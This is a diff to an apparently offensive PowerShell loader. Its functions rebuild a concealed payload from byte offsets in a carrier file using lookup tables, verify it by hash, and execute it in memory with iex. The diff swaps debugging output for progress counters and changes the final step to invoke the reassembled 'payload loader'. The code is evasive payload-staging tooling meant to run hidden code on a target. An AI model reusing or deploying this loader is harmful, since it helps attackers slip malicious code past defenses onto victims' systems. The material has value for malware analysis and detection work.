@@ -32,8 +32,11 @@ function Get-CodeExecution($payload, $some_file){{
     $tsize = 0
     $itr = 0
     $decrypted_loader = @()
-    
+    write-host "payload loader length:" $lookup_table.Length
     while($itr -lt $lookup_table.Length){{
+        if ($itr % 1000 -eq 0 ){{
+            $itr
+        }}
         $rLoc =  ([Byte[]] $lookup_table[$itr..($itr+2)]) + [Byte[]] 0x00
         $rSz =   ([Byte[]] $lookup_table[($itr+3)]) + [Byte[]] 0x00
         $tLoc = [bitconverter]::ToUInt32($rLoc, 0) 
@@ -43,7 +46,9 @@ function Get-CodeExecution($payload, $some_file){{
         $tsize = 0
         $itr+= 4
     }}
-    [System.Text.Encoding]::ASCII.GetString($payload).Trim([char]0) | iex
+
+    $decrypted_loader = [System.Text.Encoding]::ASCII.GetString($decrypted_loader).Trim([char]0)
+    iex $decrypted_loader
 
 }}
 
@@ -62,18 +67,16 @@ function Get-R-Done($some_file, $small_table,$full_table, $payload_hash ,$iternu
 
         #WTF powershell inclusive arrays too
         while($itr -lt $small_table.Length){{
+            if ($itr % 1000 -eq 0 ){{
+                    $itr
+                }}
+                
             $tmp1 = $itr+2
             $tmp2 = $itr+3
-            Write-Host "[*] Table Length: " + $small_table.Length
-            Write-Host "[*] Iterator: " + $itr
-            Write-Host "[*] Raw Location: " + ([Byte[]] $small_table[$itr..$tmp1]) + [Byte[]] 0x00
-            Write-Host "[*] Raw Size: " + ([Byte[]] $small_table[$tmp2]) + [Byte[]] 0x00
             $rLoc =  ([Byte[]] $small_table[$itr..$tmp1]) + [Byte[]] 0x00
             $rSz =   ([Byte[]] $small_table[$tmp2]) + [Byte[]] 0x00
             $tLoc = [bitconverter]::ToUInt32($rLoc, 0) 
             $tsize = [bitconverter]::ToUInt16($rSz, 0)
-            Write-Host "[*] Converted Location: " + $tLoc
-            Write-Host "[*] Converted Size: " + $tsize
             $tmpstitchCheck += [Byte[]] $read_file[$tLoc..($tLoc+$tsize-1)]
             $tLoc = 0
             $tsize = 0
@@ -110,18 +113,15 @@ function Get-R-Done($some_file, $small_table,$full_table, $payload_hash ,$iternu
 
             #WTF powershell inclusive arrays too
             while($itr -lt $full_table.Length){{
+                if ($itr % 1000 -eq 0 ){{
+                    $itr
+                }}
                 $tmp1 = $itr+2
                 $tmp2 = $itr+3
-                Write-Host "[**] Table Length: " + $small_table.Length
-                Write-Host "[**] Iterator: " + $itr
-                Write-Host "[**] Raw Location: " + ([Byte[]] $full_table[$itr..$tmp1]) + [Byte[]] 0x00
-                Write-Host "[**] Raw Size: " + ([Byte[]] $full_table[$tmp2]) + [Byte[]] 0x00
                 $rLoc =  ([Byte[]] $full_table[$itr..$tmp1]) + [Byte[]] 0x00
                 $rSz =   ([Byte[]] $full_table[$tmp2]) + [Byte[]] 0x00
                 $tLoc = [bitconverter]::ToUInt32($rLoc, 0) 
                 $tsize = [bitconverter]::ToUInt16($rSz, 0)
-                Write-Host "[**] Converted Location: " + $tLoc
-                Write-Host "[**] Converted Size: " + $tsize
                 $tmpstitchCheck += [Byte[]] $read_file[$tLoc..($tLoc+$tsize-1)]
                 $tLoc = 0
                 $tsize = 0
